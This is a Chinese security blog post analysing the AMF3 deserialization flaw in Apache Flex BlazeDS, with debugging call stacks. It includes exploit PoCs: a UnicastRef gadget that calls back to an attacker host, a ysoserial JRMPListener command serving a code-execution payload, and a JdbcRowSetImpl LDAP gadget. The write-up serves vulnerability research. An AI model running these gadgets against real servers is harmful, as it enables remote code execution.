
<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="Web安全,Java,">
  

  
    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
  
  
  
  <link rel="icon" type="image/x-icon" href="/1.jpg">
  
  <title>Java AMF3反序列化漏洞 [ Mi1k7ea ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
</head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    
    <span class="title" style="text-transform:none">Mi1k7ea</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            
              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
            
          
      
          
            
              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
            
          
      
  </ul>
   
</nav>

  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        Java AMF3反序列化漏洞
      </h1>
      <span>
        
        <time class="time" datetime="2019-12-07T03:36:41.000Z">
        2019-12-07
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
      </span>
    </span>
      <!--<span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>-->
    </header>

    <div class="post-content">
      <h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><p>AMF是Action Message Format的简称，是一种二进制序列化格式，主要用于数据交互和远程过程调用。</p>
<p>一个Action Message由头部（header）和主体（body）所组成。</p>
<p>AMF3（Action Message Format version 3）是AMF的第三版，同样是一种二进制信息编码格式，也是Flash应用在后台交互时主要使用的一种数据格式。与JSON类似，它支持不同的数据类型。考虑到向后兼容性，AMF3实际上算是AMF的一种扩展实现，并且引入了新的对象类型。</p>
<p>AMF3对象的新功能可以归结为两种新增加的特性，即Dynamic和Externalizable，这两种新特性描述了对象是如何进行序列化操作的：</p>
<ul>
<li>Dynamic：一个声明了动态特性的类实例，公共变量成员可以在程序运行时动态添加/删除到实例中；</li>
<li>Externalizable：实现flash.utils.Externalizable并完全控制器成员序列化的类实例；</li>
</ul>
<p><strong>Dynamic特性</strong></p>
<blockquote>
<p>我们可以拿Dynamic特性与JavaBeans的功能进行对比：它允许我们通过类名及属性来创建一个对象。实际上，很多JavaBeans实体目前已经实现了这种技术，例如java.beans.Introspector、Flamingo、Flex BlazeDS和WebORB等等。</p>
<p>但需要注意的是，这种功能将会导致一种可利用的漏洞产生。实际上，<a href="http://wouter.coekaerts.be/2011/amf-arbitrary-code-execution" target="_blank" rel="noopener">Wouter Coekaerts早在2011年就已经将这种存在于AMF实现中的漏洞曝光了</a>，并且还在2016年发布了相应漏洞的利用代码及PoC。</p>
</blockquote>
<p><strong>Externalizable特性</strong></p>
<blockquote>
<p>我们可以拿Externalizable特性赖于Java的java.io.Externalizable接口进行对比。实际上，很多厂商早就已经将flash.utils.IExternalizable接口的规范进行了调整，其实它与Java的java.io.Externalizable区别不大，这种特性将允许我们可以高效地对实现了java.io.Externalizable接口的类进行重构。</p>
<p>java.io.Externalizable接口定义了两个方法：即readExternal（java.io.ObjectInput）和writeExternal（java.io.ObjectInput），而这两个方法将允许java类完全控制序列化以及反序列化操作。这也就意味着，在程序的运行过程中不存在默认的序列化／反序列化行为以及有效性检测。因此，相对于java.io.Serializable来说，我们使用java.io.Externalizable来实现序列化／反序列化则更加的简单和高效。</p>
</blockquote>
<h2 id="0x02-使用AMF3序列化和反序列化"><a href="#0x02-使用AMF3序列化和反序列化" class="headerlink" title="0x02 使用AMF3序列化和反序列化"></a>0x02 使用AMF3序列化和反序列化</h2><p>本地测试用的jar：flex-messaging-core-4.7.2，flex-messaging-common-4.7.2。</p>
<p>Person类，注意该类需要实现Serializable接口类才能实现序列化和反序列化：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.getName()"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.setName()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.getAge()"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person [name="</span> + name + <span class="string">", age="</span> + age + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AMFDemo.java：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        person.setAge(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(person);</span><br><span class="line">        System.out.println(<span class="string">"序列化："</span> + amf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">        System.out.println(<span class="string">"反序列化："</span> + actionMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object data) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        MessageBody body = <span class="keyword">new</span> MessageBody();</span><br><span class="line">        body.setData(data);</span><br><span class="line">        ActionMessage message = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        message.addBody(body);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        AmfMessageSerializer serializer = <span class="keyword">new</span> AmfMessageSerializer();</span><br><span class="line">        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="keyword">null</span>);</span><br><span class="line">        serializer.writeMessage(message);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ActionMessage <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] amf)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(amf);</span><br><span class="line">        AmfMessageDeserializer deserializer = <span class="keyword">new</span> AmfMessageDeserializer();</span><br><span class="line">        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="keyword">null</span>);</span><br><span class="line">        ActionMessage actionMessage = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        deserializer.readMessage(actionMessage, <span class="keyword">new</span> ActionContext());</span><br><span class="line">        <span class="keyword">return</span> actionMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">Person.setName()</span><br><span class="line">Person.setAge()</span><br><span class="line">Person.getName()</span><br><span class="line">Person.getAge()</span><br><span class="line">序列化：[B@681a9515</span><br><span class="line">Person构造函数</span><br><span class="line">Person.setName()</span><br><span class="line">Person.setAge()</span><br><span class="line">反序列化：flex.messaging.io.amf.ActionMessage@27bc2616</span><br></pre></td></tr></table></figure>
<h2 id="0x03-AMF3反序列化过程"><a href="#0x03-AMF3反序列化过程" class="headerlink" title="0x03 AMF3反序列化过程"></a>0x03 AMF3反序列化过程</h2><p>在AMF3反序列化过程中，程序会从Action消息中获取类名，构造新的对象，然后以成员值作为参数调用每个成员名对应的setter方法。这一个过程由专门的方法来实现，比如<code>flex.messaging.io.amf.Amf3Input</code>类中的<code>readScriptObject()</code>方法或者<code>flex.messaging.io.amf.Amf0Input</code>类中的<code>readObjectValue()</code>方法。</p>
<p>在deserialize()函数中，调用了AmfMessageDeserializer.readMessage()函数来读取Action Message内容，而在其中会调用readBody()函数来进一步读取Action Message的主体内容：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/1.png" alt=""></p>
<p>接着会调用AmfMessageDeserializer.readObject()函数：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/2.png" alt=""></p>
<p>往下跟进去，看到调用Amf0Input.readObject()，其中获取到type为17，然后调用readObjectValue()：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/3.png" alt=""></p>
<p>跟进readObjectValue()函数，由于type为17，就会进入调用Amf3Input.readObject()的逻辑：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/4.png" alt=""></p>
<p>跟进Amf3Input.readObject()函数，这里获取到type为10，再调用Amf3Input.readObjectValue()：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/5.png" alt=""></p>
<p>跟进Amf3Input.readObjectValue()函数，在AMF3协议中，当type数据类型为10时，则认为Java对象，就会调用readScriptObject()读取对象：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/6.png" alt=""></p>
<p>跟进readScriptObject()函数，看到调用createObjectInstance()函数来新建对象实例，可以看到是直接创建Person类实例了：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/7.png" alt=""></p>
<p>在AbstractAmfInput.createObjectInstance()函数中，调用AbstractProxy.createInstance()函数来新建实例：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/8.png" alt=""></p>
<p>再往下就是具体调用创建对象实例的函数调用过程、调用Person类构造函数。</p>
<p>此时函数调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:7, Person</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">createDefaultInstance:120, ClassUtil (flex.messaging.util)</span><br><span class="line">createInstanceFromClassName:95, AbstractProxy (flex.messaging.io)</span><br><span class="line">createInstance:115, AbstractProxy (flex.messaging.io)</span><br><span class="line">createObjectInstance:169, AbstractAmfInput (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:746, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:40, AMFDemo</span><br><span class="line">main:19, AMFDemo</span><br></pre></td></tr></table></figure>
<p>继续往下调试，调用完Person类的构造函数创建了对象实例后，程序会返回到Amf3Input.readScriptObject()函数中继续执行，会通过for循环遍历属性并调用BeanProxy.setValue()函数进行属性值的设置：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/9.png" alt=""></p>
<p>我们跟进几层，看到set()函数是通过反射机制来调用目标属性的setter方法的：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/10.png" alt=""></p>
<p>往下就是反射调用对应的属性的setter方法，此时的函数调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setName:17, Person</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:867, BeanProxy$BeanProperty (flex.messaging.io)</span><br><span class="line">setValue:284, BeanProxy (flex.messaging.io)</span><br><span class="line">readScriptObject:776, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:40, AMFDemo</span><br><span class="line">main:19, AMFDemo</span><br></pre></td></tr></table></figure>
<p>接着遍历其他属性并反射调用其setter方法直至完成属性值的设置，最后返回对象实例。</p>
<p>此时可以看到，AMF3将对象方锦龙ActionMessage的body中，其属性值在data可看到：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/11.png" alt=""></p>
<h2 id="0x04-AMF3反序列化漏洞"><a href="#0x04-AMF3反序列化漏洞" class="headerlink" title="0x04 AMF3反序列化漏洞"></a>0x04 AMF3反序列化漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Flex BlazeDS的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的都存在反序列化漏洞。</p>
<p>具体地说，是flex-messaging-xx系列jar包的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的存在漏洞。</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>简单地说，AMF3反序列化漏洞原理就是反序列化调用了JavaBeans存在漏洞的setter方法导致的。</p>
<h3 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h3><h4 id="基于UnicastRef的Gadget"><a href="#基于UnicastRef的Gadget" class="headerlink" title="基于UnicastRef的Gadget"></a>基于UnicastRef的Gadget</h4><p>修改AMFDemo.java，添加生成generateUnicastRef类对象：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object = generateUnicastRef(<span class="string">"192.168.10.129"</span>, <span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">        System.out.println(<span class="string">"ActionMessage: "</span> + actionMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">generateUnicastRef</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        java.rmi.server.ObjID objId = <span class="keyword">new</span> java.rmi.server.ObjID();</span><br><span class="line">        sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="keyword">new</span> sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">        sun.rmi.transport.LiveRef liveRef = <span class="keyword">new</span> sun.rmi.transport.LiveRef(objId, endpoint, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> sun.rmi.server.UnicastRef(liveRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object data) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        MessageBody body = <span class="keyword">new</span> MessageBody();</span><br><span class="line">        body.setData(data);</span><br><span class="line">        ActionMessage message = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        message.addBody(body);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        AmfMessageSerializer serializer = <span class="keyword">new</span> AmfMessageSerializer();</span><br><span class="line">        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="keyword">null</span>);</span><br><span class="line">        serializer.writeMessage(message);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ActionMessage <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] amf)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(amf);</span><br><span class="line">        AmfMessageDeserializer deserializer = <span class="keyword">new</span> AmfMessageDeserializer();</span><br><span class="line">        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="keyword">null</span>);</span><br><span class="line">        ActionMessage actionMessage = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        deserializer.readMessage(actionMessage, <span class="keyword">new</span> ActionContext());</span><br><span class="line">        <span class="keyword">return</span> actionMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试下代码能否正常运行，监听下端口，看看是否能够成功建立连接：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/13.png" alt=""></p>
<p>此时，我们成功与客户端建立了一条通信连接，而且使用的还是Java RMI传输协议。</p>
<p>利用ysoserial工具，前提是目标环境存在可被反序列化利用的类，这里假设存在CommonsBeanutils1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsBeanutils1 calc.exe</span><br></pre></td></tr></table></figure>
<p>在Kali运行该命令开启JRMPListener监听，运行程序后Kali端接受到数据后就会发送payload，在Windows端就会弹计算器：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/14.png" alt=""></p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/15.png" alt=""></p>
<h4 id="基于JdbcRowSetImpl的Gadget"><a href="#基于JdbcRowSetImpl的Gadget" class="headerlink" title="基于JdbcRowSetImpl的Gadget"></a>基于JdbcRowSetImpl的Gadget</h4><p>JdbcRowSetImpl这条Gadget十分经典，原理和调试分析就不多说了，直接看PoC示例。</p>
<p><strong>注意，下面的代码写得有问题，只是给个示例方便自己记录一下，后面再进行分析修改。</strong></p>
<p>修改AMFDemo.java，传入一个JdbcRowSetImpl类对象进行反序列化，其中设置了DataSourceName和AutoCommit属性值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object = createPoC(<span class="string">"127.0.0.1"</span>, <span class="number">1389</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createPoC</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        com.sun.rowset.JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> com.sun.rowset.JdbcRowSetImpl();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jdbcRowSet.setDataSourceName(<span class="string">"ldap://"</span> + host + <span class="string">":"</span> + port + <span class="string">"/Exploit"</span>);</span><br><span class="line">            jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jdbcRowSet;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>之所以能触发，和AMF3没有直接关系，是前面初始化JdbcRowSetImpl类对象的时候触发的：</p>
<p><img src="/2019/12/07/Java-AMF3反序列化漏洞/12.png" alt=""></p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里只对UnicastRef这条Gadget进行调试分析。</p>
<p>反序列化过程在之前已经整体跟踪分析过了，我们看下关键的几个地方。</p>
<p>我们直接在UnicastRef.invoke()方法上打断点，调试直接运行到这，此时函数调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">invoke:377, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-1, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:156, DGCClient (sun.rmi.transport)</span><br><span class="line">read:312, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readExternalizable:828, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:757, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:55, AMFDemo</span><br><span class="line">main:16, AMFDemo</span><br></pre></td></tr></table></figure>
